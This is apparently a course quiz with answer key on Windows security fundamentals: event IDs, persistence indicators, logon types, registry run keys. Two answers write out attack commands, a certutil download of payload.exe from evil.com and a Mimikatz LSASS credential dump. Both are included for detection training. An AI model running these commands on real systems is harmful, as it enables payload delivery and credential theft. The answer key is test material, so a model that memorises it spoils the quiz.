# Quiz 01: Windows Security Fundamentals

**Topic:** Windows security features, hardening, and event log analysis

**Use this quiz:** After completing Demo 01 (Windows Security Features) and Guide 01 (Windows Security Baseline)

**Format:** Multiple choice — one correct answer unless marked `[multi]`

---

**Q1.** Which Windows feature prompts the user when a process attempts to elevate to administrator privileges?

A) Windows Defender
B) User Account Control (UAC)
C) Windows Firewall
D) BitLocker

**Answer: B** — UAC intercepts privilege elevation requests and requires confirmation from an administrator.

---

**Q2.** Windows Event ID **4625** means:

A) A scheduled task was created
B) A user account was created
C) An account failed to log on
D) A service was installed

**Answer: C** — 4625 = logon failure. 4624 = success. 4698 = scheduled task. 4720 = user account created. 7045 = service installed.

---

**Q3.** You see 150 Event ID 4625 entries from IP `185.220.101.5` within 60 seconds, all targeting user `administrator`. What is this?

A) Normal Windows Update traffic
B) A brute force / password spray attack
C) Kerberoasting
D) Pass-the-Hash attack

**Answer: B** — High-volume repeated logon failures from one IP targeting one account is the signature of a brute force or password spray attack.

---

**Q4.** Event ID **1102** in the Windows Security log means:

A) A new process was created
B) A user logged off
C) The security audit log was cleared
D) Windows Defender was disabled

**Answer: C** — 1102 = Security log cleared. This is a critical anti-forensics indicator — nearly always malicious during an active incident.

---

**Q5.** Which of the following is a **LOLBin** (Living off the Land Binary) commonly abused for downloading files?

A) `notepad.exe`
B) `certutil.exe`
C) `calc.exe`
D) `regedit.exe`

**Answer: B** — `certutil.exe -urlcache -f http://evil.com/payload.exe payload.exe` is a well-known LOLBin technique. Notepad, calc, and regedit are not typically abused for downloads.

---

**Q6.** `[multi]` Which of the following Windows Event IDs are strong indicators of **persistence being established**? Select all that apply.

A) 4624 (logon success)
B) 7045 (new service installed)
C) 4698 (scheduled task created)
D) 4688 (process created)
E) 4720 (user account created)

**Answer: B, C, E** — New service, scheduled task, and new user account are all persistence mechanisms. Logon and process creation events are execution/access indicators, not persistence-specific.

---

**Q7.** An attacker runs `mimikatz.exe privilege::debug sekurlsa::logonpasswords`. What are they trying to do?

A) Disable Windows Defender
B) Extract plaintext credentials and hashes from LSASS memory
C) Create a new administrator account
D) Escalate via a UAC bypass

**Answer: B** — `sekurlsa::logonpasswords` dumps credentials from the LSASS process. This is a credential access technique (MITRE T1003.001).

---

**Q8.** Which **Logon Type** in a Windows 4624 event indicates an **RDP session**?

A) Type 2 (Interactive)
B) Type 3 (Network)
C) Type 5 (Service)
D) Type 10 (RemoteInteractive)

**Answer: D** — Type 10 = RemoteInteractive = RDP or Remote Assistance. Type 2 = console logon. Type 3 = network/SMB. Type 5 = service start.

---

**Q9.** A Windows Firewall rule is configured with `Direction=Inbound`, `Action=Allow`, `Protocol=TCP`, `LocalPort=4444`. Why is this suspicious?

A) Port 4444 is a reserved system port
B) Port 4444 is a default Metasploit/reverse shell listener port
C) TCP is not allowed through Windows Firewall
D) Inbound rules cannot allow specific ports

**Answer: B** — Port 4444 is commonly used as a default reverse shell listener by Metasploit meterpreter and other tools. An inbound allow rule on this port suggests an attacker created it for C2.

---

**Q10.** You are reviewing Windows registry run keys for persistence. Which of the following paths is used for **per-user** startup persistence?

A) `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
B) `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
C) `HKLM\SYSTEM\CurrentControlSet\Services`
D) `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

**Answer: B** — `HKCU` (HKEY_CURRENT_USER) is per-user. `HKLM` (HKEY_LOCAL_MACHINE) affects all users. Services are under HKLM\SYSTEM. Winlogon persistence uses `Userinit` or `Shell` values.

---

**Score:** 10 questions × 1 point each = 10 points maximum.
7–10: Strong Windows security fundamentals.
4–6: Review the Windows security baseline guide.
0–3: Re-read Session 12 Sections 1–4.
